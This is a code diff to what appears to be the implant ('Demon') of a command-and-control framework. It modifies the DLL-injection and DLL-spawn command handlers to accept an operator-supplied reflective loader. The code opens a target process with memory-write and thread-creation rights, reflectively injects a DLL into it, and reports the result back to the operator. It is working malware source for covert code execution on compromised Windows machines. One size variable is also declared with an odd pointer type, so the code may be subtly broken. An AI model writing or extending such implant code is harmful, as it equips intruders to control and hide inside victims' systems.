@@ -1107,19 +1107,22 @@ VOID CommandInlineExecute( PPARSER Parser )
 
 VOID CommandInjectDLL( PPARSER Parser )
 {
-    PPACKAGE          Package   = PackageCreate( DEMON_COMMAND_INJECT_DLL );
+    PPACKAGE          Package    = PackageCreate( DEMON_COMMAND_INJECT_DLL );
 
-    DWORD             DllSize   = 0;
-    DWORD             Result    = 1;
-    NTSTATUS          NtStatus  = STATUS_SUCCESS;
-    PCHAR             DllBytes  = NULL;
-    HANDLE            hProcess  = NULL;
-    CLIENT_ID         ProcID    = { 0 };
-    OBJECT_ATTRIBUTES ObjAttr   = { sizeof( ObjAttr ) };
-    INJECTION_CTX     InjCtx    = { 0 };
+    DWORD             DllSize    = 0;
+    DWORD             Result     = 1;
+    NTSTATUS          NtStatus   = STATUS_SUCCESS;
+    PCHAR             DllBytes   = NULL;
+    PCHAR             DllLdrSize = 0;
+    PCHAR             DllLdr     = NULL;
+    HANDLE            hProcess   = NULL;
+    CLIENT_ID         ProcID     = { 0 };
+    OBJECT_ATTRIBUTES ObjAttr    = { sizeof( ObjAttr ) };
+    INJECTION_CTX     InjCtx     = { 0 };
 
     InjCtx.Technique = ParserGetInt32( Parser );
     InjCtx.ProcessID = ParserGetInt32( Parser );
+    DllLdr           = ParserGetBytes( Parser, &DllLdrSize );
     DllBytes         = ParserGetBytes( Parser, &DllSize );
     InjCtx.Parameter = ParserGetBytes( Parser, &InjCtx.ParameterSize );
 
@@ -1132,7 +1135,7 @@ VOID CommandInjectDLL( PPARSER Parser )
 
     if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcess( &hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, &ObjAttr, &ProcID ) ) )
     {
-        Result = DllInjectReflective( hProcess, DllBytes, DllSize, InjCtx.Parameter, InjCtx.ParameterSize, &InjCtx );
+        Result = DllInjectReflective( hProcess, DllLdr, DllLdrSize, DllBytes, DllSize, InjCtx.Parameter, InjCtx.ParameterSize, &InjCtx );
     }
     else
     {
@@ -1148,16 +1151,18 @@ VOID CommandInjectDLL( PPARSER Parser )
 
 VOID CommandSpawnDLL( PPARSER Parser )
 {
-    PPACKAGE      Package   = NULL;
-    INJECTION_CTX InjCtx    = { 0 };
-    DWORD         DllSize   = 0;
-    DWORD         ArgSize   = 0;
-    PCHAR         DllBytes  = ParserGetBytes( Parser, &DllSize );
-    PCHAR         Arguments = ParserGetBytes( Parser, &ArgSize );
-    DWORD         Result    = 0;
+    PPACKAGE      Package    = NULL;
+    INJECTION_CTX InjCtx     = { 0 };
+    DWORD         DllSize    = 0;
+    DWORD         ArgSize    = 0;
+    PCHAR         DllLdrSize = 0;
+    PCHAR         DllLdr     = ParserGetBytes( Parser, &DllLdrSize );
+    PCHAR         DllBytes   = ParserGetBytes( Parser, &DllSize );
+    PCHAR         Arguments  = ParserGetBytes( Parser, &ArgSize );
+    DWORD         Result     = 0;
 
     Package = PackageCreate( DEMON_COMMAND_SPAWN_DLL );
-    Result  = DllSpawnReflective( DllBytes, DllSize, Arguments, ArgSize, &InjCtx );
+    Result  = DllSpawnReflective( DllLdr, DllLdrSize, DllBytes, DllSize, Arguments, ArgSize, &InjCtx );
 
     PackageAddInt32( Package, Result );
     PackageTransmit( Package, NULL, NULL );
